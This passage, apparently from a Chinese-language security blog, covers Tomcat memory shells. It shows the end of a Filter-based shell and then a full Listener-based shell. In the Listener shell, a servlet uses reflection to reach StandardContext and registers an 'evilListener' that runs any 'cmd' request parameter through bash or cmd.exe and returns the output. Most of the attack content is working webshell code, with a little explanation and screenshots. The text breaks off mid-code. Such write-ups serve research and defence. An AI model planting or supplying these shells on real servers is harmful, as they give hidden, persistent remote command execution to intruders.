</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;evil!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">executeCmd</span><span class="params">(String multiLineCommand)</span> &#123;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">os</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;cmd.exe&quot;</span> : <span class="string">&quot;/bin/bash&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shellOption</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;/c&quot;</span> : <span class="string">&quot;-c&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(shell, shellOption, multiLineCommand);  </span><br><span class="line">            builder.redirectErrorStream(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(  </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()))) &#123;  </span><br><span class="line">                String line;  </span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();  </span><br><span class="line">            output.append(<span class="string">&quot;Process exited with code: &quot;</span>).append(exitCode).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;  </span><br><span class="line">            output.append(<span class="string">&quot;Error: &quot;</span>).append(e.getMessage()).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> output.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">        Filter.<span class="built_in">super</span>.init(filterConfig);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">commmand</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> executeCmd(commmand);  </span><br><span class="line">            response.getWriter().println(output);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">errorMessage</span> <span class="operator">=</span> <span class="string">&quot;Error executing command: \n&quot;</span> + e.getMessage();  </span><br><span class="line">            response.getWriter().println(errorMessage);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">        Filter.<span class="built_in">super</span>.destroy();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250730121828.png" alt="image.png"></p><h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><h4 id="源码调试-1"><a href="#源码调试-1" class="headerlink" title="源码调试"></a>源码调试</h4><p>Litener又在Filter之前<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724011341.png" alt="image.png"><br>在<code>tomcat</code>中，常见的<code>Listener</code>有以下几种：</p><ul><li>&#x3D;&#x3D;<code>ServletContextListener</code>&#x3D;&#x3D;，用来监听整个<code>Web</code>应用程序的启动和关闭事件，需要实现<code>contextInitialized</code>和<code>contextDestroyed</code>这两个方法；</li><li>&#x3D;&#x3D;<code>ServletRequestListener</code>&#x3D;&#x3D;，用来监听<code>HTTP</code>请求的创建和销毁事件，需要实现<code>requestInitialized</code>和<code>requestDestroyed</code>这两个方法；</li><li>&#x3D;&#x3D;<code>HttpSessionListener</code>&#x3D;&#x3D;，用来监听<code>HTTP</code>会话的创建和销毁事件，需要实现<code>sessionCreated</code>和<code>sessionDestroyed</code>这两个方法；</li><li>&#x3D;&#x3D;<code>HttpSessionAttributeListener</code>&#x3D;&#x3D;，监听<code>HTTP</code>会话属性的添加、删除和替换事件，需要实现<code>attributeAdded</code>、<code>attributeRemoved</code>和<code>attributeReplaced</code>这三个方法。</li></ul><p>很明显，<code>ServletRequestListener</code>是最适合做内存马的，因为它只要访问服务就能触发操作。<br>这个接口的位置在<code>javax.servlet.ServletRequestListener</code></p><p>实现一个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.MemShell;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebListener(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[+] destroy TestListener&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[+] initial TestListener&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动并发起一个请求<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724013002.png" alt="image.png"></p><p>在requestDestroyed和requestInitialized方法打断点<br>可以看见在&#x3D;&#x3D;进入context的pipLine之前&#x3D;&#x3D;, 是<code>context.fireRequestInitEvent(request.getRequest()))</code>来触发事件监听器的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724013313.png" alt="image.png"></p><p>跟进<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724013742.png" alt="image.png"><br><code>getApplicationEventListeners</code>获取的Listeners</p><p>对应方法定义如下<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724014542.png" alt="image.png"></p><p>可以看见也存在添加Listener的方法</p><h4 id="Listener内存马构造"><a href="#Listener内存马构造" class="headerlink" title="Listener内存马构造"></a>Listener内存马构造</h4><p>有了之前的经验就比较简单了<br>用servlet写个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test2&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testWithListenerServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        <span class="comment">// 获取standardContext  </span></span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">        <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> applicationContextFacade.getClass();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">            System.out.println(<span class="string">&quot;standardContext: &quot;</span> + stdctx.getClass().getName());  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">evilListener</span>();  </span><br><span class="line">            stdctx.addApplicationEventListener(listener);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        response.getWriter().println(<span class="string">&quot;Hello World!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;[+] destroy TestListener&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> sre.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> executeCmd(cmd);  </span><br><span class="line">                <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) sre.getServletRequest();  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    Class&lt;?&gt; requestClazz = requestFacade.getClass();  </span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestfield</span> <span class="operator">=</span> requestClazz.getDeclaredField(<span class="string">&quot;request&quot;</span>);  </span><br><span class="line">                    requestfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestfield.get(requestFacade);  </span><br><span class="line">                    <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();  </span><br><span class="line">                    response.getWriter().println(output);  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">                    e.printStackTrace();  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">executeCmd</span><span class="params">(String multiLineCommand)</span> &#123;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">os</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;cmd.exe&quot;</span> : <span class="string">&quot;/bin/bash&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shellOption</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;/c&quot;</span> : <span class="string">&quot;-c&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(shell, shellOption, multiLineCommand);  </span><br><span class="line">            builder.redirectErrorStream(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(  </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()))) &#123;  </span><br><span class="line">                String line;  </span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();  </span><br><span class="line">            output.append(<span class="string">&quot;Process exited with code: &quot;</span>).append(exitCode).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;  </span><br><span class="line">            output.append(<span class="string">&quot;Error: &quot;</span>).append(e.getMessage()).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> output.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span 